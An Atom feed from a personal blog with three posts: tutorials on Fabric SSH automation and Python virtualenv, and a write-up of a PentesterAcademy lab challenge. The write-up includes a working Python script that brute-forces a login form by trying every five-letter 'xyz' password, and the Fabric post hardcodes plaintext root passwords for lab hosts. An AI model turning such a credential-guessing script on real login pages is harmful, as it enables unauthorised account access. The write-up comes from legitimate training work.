<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: python | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/python/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2018-11-17T08:21:04-05:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Remote task automation with Fabric]]></title>
    <link href="http://chousensha.github.io/blog/2017/04/03/remote-task-automation-with-fabric/"/>
    <updated>2017-04-03T03:01:29-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/04/03/remote-task-automation-with-fabric</id>
    <content type="html"><![CDATA[<p>Today I will go over the use of <a href="http://docs.fabfile.org/en/1.13/">Fabric</a>, a Python library and CLI tool for executing local / remote tasks via SSH.</p>

<p><strong>Requirements</strong>:</p>

<ul>
<li>Python 2.5 or 2.7</li>
<li>Paramiko</li>
<li>SSH</li>
</ul>


<p><strong>Features at a glance</strong>:</p>

<ul>
<li>run local or remote shell commands (also with the sudo option)</li>
<li>upload / download files</li>
<li>prompt for input</li>
<li>run Python functions</li>
<li>abort execution when encountering errors by default, but also allow for error handling</li>
</ul>


<p>Install Fabric with <code>pip install fabric</code></p>

<!-- more -->


<h2>Usage</h2>

<p>The way Fabric works is by creating a file named <code>fabfile.py</code>, containing some functions, and then using the <strong>fab</strong> CLI tool to run them.</p>

<p>Let&rsquo;s look at the options available with the <strong>fab</strong> tool:</p>

<p>``` plain
fab &mdash;help
Usage: fab [options] <command>[:arg1,arg2=val2,host=foo,hosts=&lsquo;h1;h2&rsquo;,&hellip;] &hellip;</p>

<p>Options:
  -h, &mdash;help            show this help message and exit
  -d NAME, &mdash;display=NAME</p>

<pre><code>                    print detailed info about command NAME
</code></pre>

<p>  -F FORMAT, &mdash;list-format=FORMAT</p>

<pre><code>                    formats --list, choices: short, normal, nested
</code></pre>

<p>  -I, &mdash;initial-password-prompt</p>

<pre><code>                    Force password prompt up-front
</code></pre>

<p>  &mdash;initial-sudo-password-prompt</p>

<pre><code>                    Force sudo password prompt up-front
</code></pre>

<p>  -l, &mdash;list            print list of possible commands and exit
  &mdash;set=KEY=VALUE,&hellip;   comma separated KEY=VALUE pairs to set Fab env vars
  &mdash;shortlist           alias for -F short &mdash;list
  -V, &mdash;version         show program&rsquo;s version number and exit
  -a, &mdash;no_agent        don&rsquo;t use the running SSH agent
  -A, &mdash;forward-agent   forward local agent to remote end
  &mdash;abort-on-prompts    abort instead of prompting (for password, host, etc)
  -c PATH, &mdash;config=PATH</p>

<pre><code>                    specify location of config file to use
</code></pre>

<p>  &mdash;colorize-errors     Color error output
  -D, &mdash;disable-known-hosts</p>

<pre><code>                    do not load user known_hosts file
</code></pre>

<p>  -e, &mdash;eagerly-disconnect</p>

<pre><code>                    disconnect from hosts as soon as possible
</code></pre>

<p>  -f PATH, &mdash;fabfile=PATH</p>

<pre><code>                    python module file to import, e.g. '../other.py'
</code></pre>

<p>  -g HOST, &mdash;gateway=HOST</p>

<pre><code>                    gateway host to connect through
</code></pre>

<p>  &mdash;gss-auth            Use GSS-API authentication
  &mdash;gss-deleg           Delegate GSS-API client credentials or not
  &mdash;gss-kex             Perform GSS-API Key Exchange and user authentication
  &mdash;hide=LEVELS         comma-separated list of output levels to hide
  -H HOSTS, &mdash;hosts=HOSTS</p>

<pre><code>                    comma-separated list of hosts to operate on
</code></pre>

<p>  -i PATH               path to SSH private key file. May be repeated.
  -k, &mdash;no-keys         don&rsquo;t load private key files from ~/.ssh/
  &mdash;keepalive=N         enables a keepalive every N seconds
  &mdash;linewise            print line-by-line instead of byte-by-byte
  -n M, &mdash;connection-attempts=M</p>

<pre><code>                    make M attempts to connect before giving up
</code></pre>

<p>  &mdash;no-pty              do not use pseudo-terminal in run/sudo
  -p PASSWORD, &mdash;password=PASSWORD</p>

<pre><code>                    password for use with authentication and/or sudo
</code></pre>

<p>  -P, &mdash;parallel        default to parallel execution method
  &mdash;port=PORT           SSH connection port
  -r, &mdash;reject-unknown-hosts</p>

<pre><code>                    reject unknown hosts
</code></pre>

<p>  &mdash;sudo-password=SUDO_PASSWORD</p>

<pre><code>                    password for use with sudo only
</code></pre>

<p>  &mdash;system-known-hosts=SYSTEM_KNOWN_HOSTS</p>

<pre><code>                    load system known_hosts file before reading user
                    known_hosts
</code></pre>

<p>  -R ROLES, &mdash;roles=ROLES</p>

<pre><code>                    comma-separated list of roles to operate on
</code></pre>

<p>  -s SHELL, &mdash;shell=SHELL</p>

<pre><code>                    specify a new shell, defaults to '/bin/bash -l -c'
</code></pre>

<p>  &mdash;show=LEVELS         comma-separated list of output levels to show
  &mdash;skip-bad-hosts      skip over hosts that can&rsquo;t be reached
  &mdash;skip-unknown-tasks  skip over unknown tasks
  &mdash;ssh-config-path=PATH</p>

<pre><code>                    Path to SSH config file
</code></pre>

<p>  -t N, &mdash;timeout=N     set connection timeout to N seconds
  -T N, &mdash;command-timeout=N</p>

<pre><code>                    set remote command timeout to N seconds
</code></pre>

<p>  -u USER, &mdash;user=USER  username to use when connecting to remote hosts
  -w, &mdash;warn-only       warn, instead of abort, when commands fail
  -x HOSTS, &mdash;exclude-hosts=HOSTS</p>

<pre><code>                    comma-separated list of hosts to exclude
</code></pre>

<p>  -z INT, &mdash;pool-size=INT</p>

<pre><code>                    number of concurrent processes to use in parallel mode
</code></pre>

<p>```</p>

<p>The <strong>fab</strong> tool can execute functions from a fabfile.py by passing the function name, like so: <code>fab func-name</code></p>

<h2>Examples</h2>

<p>Let&rsquo;s take a look at a couple of simple fabfiles, before making a more contrived one:</p>

<h3>Run commands on the local host</h3>

<p>``` python
from fabric.api import *</p>

<p>@task
def local_info():</p>

<pre><code>    local('whoami')
</code></pre>

<p>```</p>

<p>Run it:</p>

<p>``` plain
fab local_info          <br/>
[localhost] local: whoami
root</p>

<p>Done.
```</p>

<h3>Run commands on remote host &ndash; password authentication</h3>

<p>Next, let&rsquo;s use SSH with a password to log in to a remote host and do something on it:</p>

<p>``` python
from fabric.api import *</p>

<p>env.hosts = [&lsquo;192.168.216.128&rsquo;]
env.user = &lsquo;root&rsquo; # default is the local user
env.password = &lsquo;password&rsquo; # can be used both for SSH authentication and sudo</p>

<p>@task
def remote_info():</p>

<pre><code>    run('uname -a')
</code></pre>

<p>```</p>

<p>And the output:</p>

<p>``` plain
fab remote_info
[192.168.216.128] Executing task &lsquo;remote_info&rsquo;
[192.168.216.128] run: uname -a
[192.168.216.128] out: Linux localhost.localdomain 3.10.0-514.2.2.el7.x86_64 #1 SMP Tue Dec 6 23:06:41 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
[192.168.216.128] out:</p>

<p>Done.
Disconnecting from 192.168.216.128&hellip; done.
```</p>

<h3>Run commands on remote host &ndash; key authentication</h3>

<p>SSH with a password might be ok for demonstration purposes, but we will most likely want to use public key authentication. First, generate the key that we&rsquo;ll use later:</p>

<p><code>plain
ssh-keygen -t rsa -b 2048 -v
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): mykey.pem
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in mykey.pem.
Your public key has been saved in mykey.pem.pub.
</code></p>

<p>Next, copy the key to the remote host&rsquo;s <code>~/.ssh/authorized_keys</code> location:</p>

<p>``` plain
ssh-copy-id -i ~/mykey.pem.pub <a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#111;&#58;&#114;&#111;&#111;&#116;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#x2e;&#x32;&#49;&#x36;&#46;&#x31;&#50;&#56;">&#x72;&#x6f;&#x6f;&#116;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#x2e;&#50;&#x31;&#x36;&#x2e;&#49;&#x32;&#x38;</a>
/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: &ldquo;/root/mykey.pem.pub&rdquo;
/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed
/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed &mdash; if you are prompted now it is to install the new keys
<a href="&#x6d;&#x61;&#x69;&#108;&#116;&#x6f;&#x3a;&#x72;&#111;&#x6f;&#x74;&#64;&#49;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#50;&#x31;&#x36;&#x2e;&#x31;&#x32;&#x38;">&#x72;&#x6f;&#111;&#116;&#x40;&#x31;&#57;&#x32;&#x2e;&#x31;&#x36;&#56;&#46;&#50;&#x31;&#54;&#x2e;&#49;&#50;&#56;</a>&rsquo;s password:</p>

<p>Number of key(s) added: 1</p>

<p>Now try logging into the machine, with:   &ldquo;ssh &lsquo;<a href="&#109;&#97;&#x69;&#108;&#116;&#111;&#58;&#114;&#x6f;&#x6f;&#x74;&#64;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#x38;&#x2e;&#50;&#49;&#54;&#46;&#49;&#x32;&#56;">&#x72;&#x6f;&#x6f;&#x74;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#54;&#x38;&#46;&#x32;&#49;&#54;&#46;&#x31;&#x32;&#x38;</a>&rsquo;&rdquo;
and check to make sure that only the key(s) you wanted were added.
```</p>

<p>Make the .pem key read-only and then try logging in by passing it to the ssh -i option:</p>

<p><code>plain
chmod 400 mykey.pem
ssh -i mykey.pem root@192.168.216.128
Last failed login: Tue Mar 28 12:28:43 EEST 2017 from 192.168.216.1 on ssh:notty
There were 2 failed login attempts since the last successful login.
Last login: Tue Mar 28 11:30:19 2017 from 192.168.216.1
[root@localhost ~]#
</code></p>

<p>Now add the key file in Fabric:</p>

<p>``` python
from fabric.api import *</p>

<p>env.hosts = [&lsquo;192.168.217.131&rsquo;]
env.user = &lsquo;root&rsquo;
env.key_filename = &lsquo;~/.ssh/mykey.pem&rsquo;</p>

<p>@task
def remote_info():</p>

<pre><code>    run('uptime')
</code></pre>

<p>```</p>

<h3>Run commands on multiple hosts</h3>

<p>If you want to run a command on a host, and a different command on another host, you can do so by specifying which host you want to run a command on:</p>

<p>``` python
from fabric.api import *</p>

<p>env.user = &lsquo;root&rsquo;
env.key_filename = &lsquo;~/mykey.pem&rsquo;</p>

<p>@task
def local_info():</p>

<pre><code>print('This runs only on the localhost')
</code></pre>

<p>@hosts(&lsquo;192.168.216.128&rsquo;)
@task
def remote_info():</p>

<pre><code>    print('This runs only on the remote host')
</code></pre>

<p>```</p>

<p>Here is how it would look like:</p>

<p>``` plain
fab local_info remote_info
This runs only on the localhost
[192.168.216.128] Executing task &lsquo;remote_info&rsquo;
This runs only on the remote host</p>

<p>Done.
```</p>

<h3>Download / upload files</h3>

<p>Fabric also has built-in functionality for downloading and uploading files:</p>

<p>``` python
@task
def download():</p>

<pre><code>    get('~/Desktop/ssh.sh')
</code></pre>

<p>```</p>

<p>Result:</p>

<p>``` plain
fab download
[192.168.23.128] Executing task &lsquo;download&rsquo;
[192.168.23.128] download: path/192.168.23.128/ssh.sh &lt;&ndash; /root/Desktop/ssh.sh</p>

<p>Done.
Disconnecting from 192.168.23.128&hellip; done.
```</p>

<p>And the upload:</p>

<p>``` python
@task
def upload():</p>

<pre><code>    put('file.txt', '~/Desktop')
</code></pre>

<p>```</p>

<p>Output:</p>

<p>``` plain
fab upload
[192.168.23.128] Executing task &lsquo;upload&rsquo;
[192.168.23.128] put: file.txt &ndash;> /root/Desktop/file.txt</p>

<p>Done.
Disconnecting from 192.168.23.128&hellip; done.
```</p>

<h3>Run sudo commands</h3>

<p>We saw some examples of using the root user, but Fabric allows running sudo commands from users with lower privileges:</p>

<p>``` python
from fabric.api import *</p>

<p>env.hosts = [&lsquo;192.168.217.131&rsquo;]
env.user = &lsquo;nixhat&rsquo;</p>

<p>@task
def cfg_test():</p>

<pre><code>    sudo('apachectl configtest')
</code></pre>

<p>```</p>

<p>And here it is in action:</p>

<p>``` plain
fab cfg_test
[192.168.217.131] Executing task &lsquo;cfg_test&rsquo;
[192.168.217.131] sudo: apachectl configtest
[192.168.217.131] Login password for &lsquo;nixhat&rsquo;:
[192.168.217.131] out: sudo password:
[192.168.217.131] out: AH00558: httpd: Could not reliably determine the server&rsquo;s
 fully qualified domain name, using localhost.localdomain. Set the &lsquo;ServerName&rsquo;
directive globally to suppress this message
[192.168.217.131] out: Syntax OK
[192.168.217.131] out:</p>

<p>Done.
Disconnecting from 192.168.217.131&hellip; done.
```</p>

<h3>Specifying multiple hosts with different users and passwords</h3>

<p>In case you have many hosts that you would like to run commands on as different users, you can do so:</p>

<p><code>python
env.hosts = ['root@192.168.217.130', 'nixhat@192.168.216.128'] # hosts to run cmds on
env.passwords = {'root@192.168.217.130':'password1', 'nixhat@192.168.216.128':'password2'}
</code></p>

<h3>Running tasks on predefined hosts</h3>

<p>If you have tasks that you want to run on certain hosts only, you can specify that:</p>

<p>``` python
@hosts(&lsquo;host1&rsquo;, &lsquo;host2&rsquo;)
def mytask():</p>

<pre><code>run('cmd')
</code></pre>

<p>```</p>

<h3>Classifying hosts into roles</h3>

<p>In a large environment, you are most likely to have many hosts that fulfill some roles, such as development machines and production servers. You can organize them in the Fabric code:</p>

<p>``` python
env.roledefs = {</p>

<pre><code>'production': ['prod1', 'prod2'],
'development': ['dev1', 'dev2']
</code></pre>

<p>}
```</p>

<h3>Automating code deployment</h3>

<p>In a <a href="https://chousensha.github.io/blog/2017/03/30/using-git-for-code-deployment/">previous post</a>, we used Git for updating the code on a live server from a development machine. This time, we&rsquo;ll use Fabric to automate the process!</p>

<p>Besides the development and production servers we had before, we&rsquo;ll use a third computer to run the Fabric commands from. Let&rsquo;s assume this is your sysadmin machine, from which magic happens on the network. The developers made some changes to the code on the dev server, and you want to push them to production:</p>

<p>``` python
from fabric.api import *</p>

<h1>script must be called fabfile.py</h1>

<h1>fab -l &ndash; list available cmds</h1>

<h1>fab CMDNAME &ndash; run cmd</h1>

<h1>the env dictionary allows for setting different variables for customizing the configuration</h1>

<p>env.colorize_errors = &lsquo;true&rsquo; # color errors in red and warnings in magenta</p>

<p>env.roledefs = {</p>

<pre><code>'dev': ['root@192.168.217.130:22 '],
'prod': ['root@192.168.217.131:22'],
}
</code></pre>

<p>env.passwords = {&lsquo;root@192.168.217.130:22&rsquo;:&lsquo;5t0rm80rn&rsquo;, &lsquo;root@192.168.217.131:22&rsquo;:&lsquo;hakubo10&rsquo;}</p>

<p>@roles(&lsquo;dev&rsquo;)
@task
def prep():</p>

<pre><code>'''
Stage and commit new and modified files
:return:
'''
with settings(warn_only=True): # continue executing even if errors were encountered
    with cd('/root/Testing/Dev'):
        run('git add . &amp;&amp; git commit -m "Add changes"')
</code></pre>

<p>@roles(&lsquo;dev&rsquo;)
@task
def push():</p>

<pre><code>with cd('/root/Testing/Dev'):
    run('git push production')
</code></pre>

<p>@roles(&lsquo;prod&rsquo;)
@task
def chk():</p>

<pre><code>'''
Confirm that files have been updated on the web server
:return:
'''
run('ls /var/www/html/myweb/site')
</code></pre>

<p>```</p>

<p>Now list the available commands:</p>

<p>``` plain
fab -l
Available commands:</p>

<pre><code>chk   Confirm that files have been updated on the web server
prep  Stage and commit new and modified files
push
</code></pre>

<p>```</p>

<p>And run them:</p>

<p>``` plain
fab prep push chk
[root@192.168.217.130:22] Executing task &lsquo;prep&rsquo;
[root@192.168.217.130:22] run: git add . &amp;&amp; git commit -m &ldquo;Add changes&rdquo;
[root@192.168.217.130:22] out: [master 5719a02] Add changes
[root@192.168.217.130:22] out:  1 file changed, 1 insertion(+), 1 deletion(&ndash;)
[root@192.168.217.130:22] out:</p>

<p>[root@192.168.217.130:22] Executing task &lsquo;push&rsquo;
[root@192.168.217.130:22] run: git push production
[root@192.168.217.130:22] out: <a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#111;&#x3a;&#x72;&#x6f;&#111;&#116;&#64;&#49;&#x39;&#50;&#46;&#49;&#54;&#56;&#x2e;&#x32;&#x31;&#x37;&#x2e;&#49;&#x33;&#x31;">&#114;&#x6f;&#x6f;&#116;&#64;&#x31;&#57;&#x32;&#46;&#x31;&#54;&#56;&#46;&#x32;&#49;&#55;&#x2e;&#x31;&#51;&#x31;</a>&rsquo;s password:
[root@192.168.217.130:22] out: Counting objects: 3, done.
[root@192.168.217.130:22] out: Compressing objects:  33% (1/3)
[root@192.168.217.130:22] out: Compressing objects:  66% (2/3)
[root@192.168.217.130:22] out: Compressing objects: 100% (3/3)
[root@192.168.217.130:22] out: Compressing objects: 100% (3/3), done.
[root@192.168.217.130:22] out: Writing objects:  33% (1/3)
[root@192.168.217.130:22] out: Writing objects:  66% (2/3)
[root@192.168.217.130:22] out: Writing objects: 100% (3/3)
[root@192.168.217.130:22] out: Writing objects: 100% (3/3), 294 bytes | 0 bytes/
s, done.
[root@192.168.217.130:22] out: Total 3 (delta 2), reused 0 (delta 0)
[root@192.168.217.130:22] out: To 192.168.217.131:Prod
[root@192.168.217.130:22] out:    39e598d..5719a02  master &ndash;> master
[root@192.168.217.130:22] out:</p>

<p>[root@192.168.217.131:22] Executing task &lsquo;chk&rsquo;
[root@192.168.217.131:22] run: ls /var/www/html/myweb/site
[root@192.168.217.131:22] out: index.html  new.html  updates.html
[root@192.168.217.131:22] out:</p>

<p>Done.
Disconnecting from <a href="&#x6d;&#x61;&#x69;&#108;&#116;&#111;&#x3a;&#x72;&#x6f;&#x6f;&#116;&#x40;&#49;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#x2e;&#x32;&#49;&#x37;&#x2e;&#x31;&#x33;&#x30;&#46;&#46;&#46;">&#x72;&#x6f;&#x6f;&#x74;&#64;&#x31;&#x39;&#x32;&#46;&#49;&#54;&#56;&#46;&#50;&#49;&#x37;&#x2e;&#x31;&#x33;&#x30;&#46;&#46;&#x2e;</a> done.
Disconnecting from <a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#58;&#x72;&#x6f;&#x6f;&#116;&#64;&#x31;&#x39;&#x32;&#x2e;&#x31;&#54;&#x38;&#x2e;&#50;&#49;&#x37;&#x2e;&#x31;&#51;&#x31;&#46;&#x2e;&#x2e;">&#x72;&#x6f;&#x6f;&#116;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#x38;&#x2e;&#x32;&#49;&#55;&#46;&#x31;&#51;&#49;&#46;&#46;&#46;</a> done.
```</p>

<p>In a file with many tasks, it will get tiresome to always specify them on the command line. You can organize your code to have a function that calls other tasks, respecting the roles and settings for each. Add this to the previous code:</p>

<p>``` python
@task
def deploy():</p>

<pre><code>'''
Execute previous tasks by taking into account the defined roles 
:return:
'''
execute(prep) # on dev
execute (push) # on dev
execute(chk) # on prod
</code></pre>

<p>```</p>

<p>Now you can run only <code>fab deploy</code> to get the same results!</p>

<p>``` plain
/ In the stairway of life, you&rsquo;d best \
\ take the elevator.                  /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Python virtualenv]]></title>
    <link href="http://chousensha.github.io/blog/2016/07/29/python-virtualenv/"/>
    <updated>2016-07-29T17:55:18-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/07/29/python-virtualenv</id>
    <content type="html"><![CDATA[<p>In this post I am going to introduce Python&rsquo;s virtual environments, through the <strong>virtualenv</strong> tool. With this tool, you can keep separate environments for your projects, with their own dependencies and executables. By isolating the project environments, you can keep them neat and organized, without messing up your global installation. Depending on the requirements of what you&rsquo;re working on, you can use different versions of Python or keep older libraries on a per-project basis. Nothing outside the virtual environment will be modified.</p>

<!-- more -->


<h1>Installation</h1>

<p>To begin with, install <em>virtualenv</em>. You can do it in several ways. Via pip: <code>pip install virtualenv</code>, or with easy_install: <code>easy_install virtualenv</code>. Now let&rsquo;s look at the help menu:</p>

<p>``` plain
root@kali:~# virtualenv -h
Usage: virtualenv [OPTIONS] DEST_DIR</p>

<p>Options:
  &mdash;version             show program&rsquo;s version number and exit
  -h, &mdash;help            show this help message and exit
  -v, &mdash;verbose         Increase verbosity.
  -q, &mdash;quiet           Decrease verbosity.
  -p PYTHON_EXE, &mdash;python=PYTHON_EXE</p>

<pre><code>                    The Python interpreter to use, e.g.,
                    --python=python2.5 will use the python2.5 interpreter
                    to create the new environment.  The default is the
                    interpreter that virtualenv was installed with
                    (/usr/bin/python)
</code></pre>

<p>  &mdash;clear               Clear out the non-root install and start from scratch.
  &mdash;no-site-packages    DEPRECATED. Retained only for backward compatibility.</p>

<pre><code>                    Not having access to global site-packages is now the
                    default behavior.
</code></pre>

<p>  &mdash;system-site-packages</p>

<pre><code>                    Give the virtual environment access to the global
                    site-packages.
</code></pre>

<p>  &mdash;always-copy         Always copy files rather than symlinking.
  &mdash;unzip-setuptools    Unzip Setuptools when installing it.
  &mdash;relocatable         Make an EXISTING virtualenv environment relocatable.</p>

<pre><code>                    This fixes up scripts and makes all .pth files
                    relative.
</code></pre>

<p>  &mdash;no-setuptools       Do not install setuptools in the new virtualenv.
  &mdash;no-pip              Do not install pip in the new virtualenv.
  &mdash;no-wheel            Do not install wheel in the new virtualenv.
  &mdash;extra-search-dir=DIR</p>

<pre><code>                    Directory to look for setuptools/pip distributions in.
                    This option can be used multiple times.
</code></pre>

<p>  &mdash;download            Download preinstalled packages from PyPI.
  &mdash;no-download, &mdash;never-download</p>

<pre><code>                    Do not download preinstalled packages from PyPI.
</code></pre>

<p>  &mdash;prompt=PROMPT       Provides an alternative prompt prefix for this</p>

<pre><code>                    environment.
</code></pre>

<p>  &mdash;setuptools          DEPRECATED. Retained only for backward compatibility.</p>

<pre><code>                    This option has no effect.
</code></pre>

<p>  &mdash;distribute          DEPRECATED. Retained only for backward compatibility.</p>

<pre><code>                    This option has no effect.
</code></pre>

<p>```</p>

<h1>Usage</h1>

<p>So you&rsquo;re about to begin a new project. You want to start from scratch and keep it contained to itself. Creating a virtual environment will help you accomplish that:</p>

<p><code>virtualenv my_project</code></p>

<p>Now you can go to the newly created directory and see that there are already some folders inside. <code>bin</code> has the executables, <code>include</code> holds the header files, and <code>lib</code> contains the files of the installed modules in the virtual environment.</p>

<p>Before you begin to work with your new environment, you need to activate it with <code>source bin/activate</code> or <code>source env_name/bin/activate</code> if you are outside the environment&rsquo;s directory.</p>

<p>You will now see your propmt change, to confirm that the environment is active. For me, it looks like:</p>

<p><code>plain
(my_project) root@kali:~/projects/my_project#
</code></p>

<p>Now you can begin your work, installing packages, etc. When you&rsquo;re done, you can type <code>deactivate</code> to exit your environment. If you want to delete it, just remove its directory.</p>

<p>When working with virtual environments, it might be helpful to take a snapshot of your installed packages and their versions, in case you want to recreate the environment later. You can do this with <code>pip freeze > requirements.txt</code>. Check the newly created file for a list of your snapshotted items. In my case, I only installed requests in my environment so far:</p>

<p><code>plain
cat requirements.txt
requests==2.10.0
</code></p>

<p>If you need the exact same environment later, maybe to let some one of your team to work on the project, you can install the same packages and versions with the command <code>pip install -r requirements.txt</code></p>

<h2>virtualenvwrapper</h2>

<p>To make working with virtual environments even more convenient, you can use <em>virtualenvwrapper</em>, which provides wrappers for managing your environments and helps keep all your environments in one place. It also allows you to switch between environments with only one command, and has tab completion.</p>

<p>First, install it (outside your environments), with <code>pip install virtualenvwrapper</code>.</p>

<p>Then you need to add a few lines to your shell startup script. In my <code>~/.bashrc</code> file, I added the following:</p>

<p>``` plain</p>

<h1>set the location where your virtual environments will be stored</h1>

<p>export WORKON_HOME=$HOME/.virtualenvs</p>

<h1>set the location of the virtualenvwrapper script (where it was installed)</h1>

<p>source /usr/local/bin/virtualenvwrapper.sh
```</p>

<p>Now reload the startup file: <code>source ~/.bashrc</code> and you will see that your .virtualenvs folder has been created and populated with some scripts. Let&rsquo;s look at the help menu to see the available commands:</p>

<p>``` plain
virtualenvwrapper</p>

<p>virtualenvwrapper is a set of extensions to Ian Bicking&rsquo;s virtualenv
tool.  The extensions include wrappers for creating and deleting
virtual environments and otherwise managing your development workflow,
making it easier to work on more than one project at a time without
introducing conflicts in their dependencies.</p>

<p>For more information please refer to the documentation:</p>

<pre><code>http://virtualenvwrapper.readthedocs.org/en/latest/command_ref.html
</code></pre>

<p>Commands available:</p>

<p>  add2virtualenv: add directory to the import path</p>

<p>  allvirtualenv: run a command in all virtualenvs</p>

<p>  cdproject: change directory to the active project</p>

<p>  cdsitepackages: change to the site-packages directory</p>

<p>  cdvirtualenv: change to the $VIRTUAL_ENV directory</p>

<p>  cpvirtualenv: duplicate the named virtualenv to make a new one</p>

<p>  lssitepackages: list contents of the site-packages directory</p>

<p>  lsvirtualenv: list virtualenvs</p>

<p>  mkproject: create a new project directory and its associated virtualenv</p>

<p>  mktmpenv: create a temporary virtualenv</p>

<p>  mkvirtualenv: Create a new virtualenv in $WORKON_HOME</p>

<p>  rmvirtualenv: Remove a virtualenv</p>

<p>  setvirtualenvproject: associate a project directory with a virtualenv</p>

<p>  showvirtualenv: show details of a single virtualenv</p>

<p>  toggleglobalsitepackages: turn access to global site-packages on/off</p>

<p>  virtualenvwrapper: show this help message</p>

<p>  wipeenv: remove all packages installed in the current virtualenv</p>

<p>  workon: list or change working virtualenvs
```</p>

<p>Ok, let&rsquo;s create a new environment: <code>mkvirtualenv beta_proj</code>. You can list all your environments with <code>lsvirtualenv</code></p>

<p>``` plain
lsvirtualenv</p>

<h1>beta_proj</h1>

<p>```</p>

<p>Use the <code>workon</code> command to begin..working on your new environment: <code>workon beta_proj</code>. When finished, you can use <code>deactivate</code> again,or you can switch between multiple environments with <code>workon</code>.</p>

<p>Removing an environment can be done with the <code>rmvirtualenv</code> command</p>

<p>That&rsquo;s about all the basic tips needed to quick start your use of virtual environments in your Python projects. For more information, you can check the <a href="https://virtualenv.pypa.io/en/stable/">virtualenv</a> and <a href="https://virtualenvwrapper.readthedocs.io/en/latest/index.html">virtualenvwrapper</a> documentation.</p>

<p>``` plain</p>

<hr />

<p>/ Do what comes naturally. Seethe and \
\ fume and throw a tantrum.           /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PentesterAcademy WAP Challenge 1: Form Bruteforcing]]></title>
    <link href="http://chousensha.github.io/blog/2014/07/26/pentesteracademy-wap-challenge-1-form-bruteforcing/"/>
    <updated>2014-07-26T17:31:26-04:00</updated>
    <id>http://chousensha.github.io/blog/2014/07/26/pentesteracademy-wap-challenge-1-form-bruteforcing</id>
    <content type="html"><![CDATA[<p><a href="http://www.pentesteracademy.com">PentesterAcademy</a> has a section dedicated to web application security challenges. In this post I will present my solution to the first challenge, which requires form bruteforcing to authenticate on the provided web page:</p>

<p><a href="http://pentesteracademylab.appspot.com/lab/webapp/1">http://pentesteracademylab.appspot.com/lab/webapp/1</a></p>

<!-- more -->


<p>This is how the page looks like:</p>

<p><img class="center" src="/images/wap1.png" title="&lsquo;wap1&rsquo; &lsquo;wap1&rsquo;" ></p>

<p>The provided hint should help with writing a bruteforce script:</p>

<p><strong>Hint:</strong></p>

<p><strong>Company Domain: PentesterAcademy.com</strong></p>

<p><strong>Usernames: jack, admin</strong></p>

<p><strong>Password Complexity: 5 characters and uses only x,y,z lowercase. Password examples &ndash; xxyyz, xyzxy, xyxxx etc.</strong></p>

<p>So, what we need here is to test the login with usernames of the form <em>user@companydomain</em> and 5 character passwords constructed from the given characters.</p>

<p>I wrote a Python script to do that:</p>

<p>``` python
import requests
import itertools</p>

<p>url = &lsquo;<a href="http://pentesteracademylab.appspot.com/lab/webapp/1">http://pentesteracademylab.appspot.com/lab/webapp/1</a>&rsquo;</p>

<p>emails = [&lsquo;<a href="&#109;&#97;&#x69;&#108;&#x74;&#x6f;&#x3a;&#106;&#97;&#99;&#x6b;&#x40;&#x70;&#x65;&#x6e;&#x74;&#101;&#115;&#x74;&#x65;&#x72;&#x61;&#x63;&#x61;&#x64;&#101;&#109;&#x79;&#x2e;&#99;&#x6f;&#x6d;">&#106;&#97;&#x63;&#x6b;&#x40;&#x70;&#101;&#110;&#x74;&#x65;&#x73;&#116;&#x65;&#114;&#97;&#x63;&#97;&#x64;&#x65;&#x6d;&#121;&#46;&#99;&#111;&#x6d;</a>&rsquo;, \</p>

<pre><code>      'admin@pentesteracademy.com']
</code></pre>

<p>def buildPassList(iterables, r):</p>

<pre><code>passlist = []
for word in itertools.product(iterables, repeat = r):
    passlist.append(''.join(word))
return passlist
</code></pre>

<p>passlist = buildPassList(&lsquo;xyz&rsquo;, 5)</p>

<p>count = 0
fail = &lsquo;Failed! Please try again!&rsquo;
for user in emails:</p>

<pre><code>for passwd in passlist:
    print 'Try %d - email: %s password: %s' % (count, user, passwd)
    payload = {'email': user, 'password': passwd}
    req = requests.get(url, params=payload)
    if fail not in req.content:
        print payload
        print req.content
        break          
    count += 1
</code></pre>

<p>```</p>

<p>I used the requests module, which is very handy for all sorts of URL interaction. To figure out the parameter names and how are they passed to the login form, I tested with some garbage values and saw the URL looked like this:</p>

<p><code>plain
http://pentesteracademylab.appspot.com/lab/webapp/1?email=test&amp;password=xyz
</code></p>

<p>From that I knew to use the GET request in the code. Also, when you fail, you get a message stating that you should try again, so I looked for that in the response from the server, and I concluded that if it were absent, it means that the login was successful. When you complete the challenge, there is also a message that says &ldquo;Well done! This challenge has been cracked!&rdquo;</p>

<p>Here is a snippet of the output:</p>

<p><code>plain
Try 0 - email: jack@pentesteracademy.com password: xxxxx
Try 1 - email: jack@pentesteracademy.com password: xxxxy
...
Try 477 - email: admin@pentesteracademy.com password: zzzxx
